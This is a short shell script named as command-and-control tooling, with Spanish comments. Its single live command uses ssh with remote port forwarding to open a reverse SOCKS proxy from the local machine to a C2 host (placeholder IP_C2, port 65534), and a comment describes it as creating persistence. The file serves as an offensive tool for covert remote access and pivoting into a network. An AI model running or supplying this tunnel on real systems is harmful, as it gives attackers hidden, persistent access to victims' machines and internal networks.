#
# tunel_panel_c2.sh
#
# ssh -fN -R 127.0.0.1:1080 antonio@192.168.1.52  
# Crea persistencia desde esta maquina, conecta con otra y deja abierta en esa otra un proxy socksx
#

ssh -fN -R 127.0.0.1:1080 admin@IP_C2 -p 65534
